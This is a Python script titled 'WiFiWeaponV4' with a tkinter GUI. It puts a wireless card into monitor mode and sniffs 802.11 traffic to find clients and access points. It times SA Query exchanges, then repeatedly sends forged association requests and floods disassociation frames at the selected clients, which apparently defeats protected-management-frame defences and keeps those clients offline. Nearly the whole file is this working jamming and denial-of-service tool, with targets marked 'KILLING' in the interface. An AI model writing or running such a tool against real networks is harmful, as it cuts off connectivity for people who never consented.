import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class WiFiWeaponV4:
    def __init__(self, iface):
        self.iface = iface
        self.clients = {}  
        self.persistent_targets = set()
        self.calibrated_timeouts = {} # {BSSID: timeout_value}
        
        self.prepare_hardware()
        
        self.root = tk.Tk()
        self.root.title("Calibrated Logic Controller v4.0")
        self.root.geometry("700x500")
        self.root.configure(bg="#050505")

        # UI Setup (Scrollbar + Listbox)
        self.frame = tk.Frame(self.root, bg="#050505")
        self.frame.pack(fill="both", expand=True, padx=10, pady=10)
        self.scrollbar = tk.Scrollbar(self.frame)
        self.scrollbar.pack(side="right", fill="y")
        self.listbox = tk.Listbox(self.frame, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), yscrollcommand=self.scrollbar.set)
        self.listbox.pack(side="left", fill="both", expand=True)
        self.scrollbar.config(command=self.listbox.yview)

        tk.Button(self.root, text="CALIBRATED ATTACK", command=self.toggle_persistent, bg="#AA0000", fg="white", font=("Arial", 10, "bold")).pack(pady=10)

        threading.Thread(target=self.discovery_engine, daemon=True).start()
        threading.Thread(target=self.attack_engine, daemon=True).start()

    def prepare_hardware(self):
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def discovery_engine(self):
        def handler(pkt):
            # Logic: Track clients and capture SA Queries for calibration
            if pkt.haslayer(Dot11):
                dot11 = pkt.getlayer(Dot11)
                if dot11.type == 2: # Data
                    c, b = dot11.addr2, dot11.addr3
                    if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
                        if c not in self.clients:
                            self.clients[c] = {"BSSID": b, "last_query": 0}
                            self.root.after(0, self.refresh_ui)

                # Capture SA Query for live calibration
                if dot11.type == 0 and dot11.subtype == 13 and raw(pkt.payload).startswith(b'\x08'):
                    target_client = dot11.addr1
                    if target_client in self.clients:
                        self.clients[target_client]["last_query"] = time.time()

                # Capture final Deauth to finalize timeout math
                if pkt.haslayer(Dot11Deauth):
                    c, b = pkt.addr1, pkt.addr2
                    if c in self.clients and self.clients[c]["last_query"] > 0:
                        timeout = time.time() - self.clients[c]["last_query"]
                        self.calibrated_timeouts[b] = timeout
                        print(f"[*] Calibrated {b}: {timeout:.3f}s")
                        self.clients[c]["last_query"] = 0 # Reset

        sniff(iface=self.iface, prn=handler, store=0)

    def attack_engine(self):
        while True:
            for client_mac in list(self.persistent_targets):
                data = self.clients.get(client_mac)
                if not data: continue
                
                b = data["BSSID"]
                # Logic: Use calibrated timeout or default to 0.2s
                wait_time = self.calibrated_timeouts.get(b, 0.2)
                
                # Step 1: Trigger the SA Query Race
                trigger = RadioTap()/Dot11(addr1=b, addr2=client_mac, addr3=b)/Dot11AssoReq()
                sendp(trigger, iface=self.iface, verbose=False)
                
                # Step 2: "Burst" logic - Keep the air busy for the duration of the timeout
                # This ensures the client's reply is never heard by the AP
                end_burst = time.time() + wait_time + 0.05
                while time.time() < end_burst:
                    p = RadioTap()/Dot11(addr1=client_mac, addr2=b, addr3=b)/Dot11Disas(reason=6)
                    sendp(p, count=1, verbose=False)
                
            time.sleep(0.5)

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.clients.items():
            b = info['BSSID']
            t = self.calibrated_timeouts.get(b, "PENDING")
            status = f"CALIBRATED ({t:.2f}s)" if isinstance(t, float) else "[SCANNING]"
            prefix = ">> KILLING <<" if mac in self.persistent_targets else status
            self.listbox.insert(tk.END, f"{prefix} Client: {mac} | AP: {b}")

    def toggle_persistent(self):
        for i in self.listbox.curselection():
            mac = list(self.clients.keys())[i]
            if mac in self.persistent_targets: self.persistent_targets.remove(mac)
            else: self.persistent_targets.add(mac)
        self.refresh_ui()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 weapon.py [interface]")
    else:
        app = WiFiWeaponV4(sys.argv[1])
        app.root.mainloop()
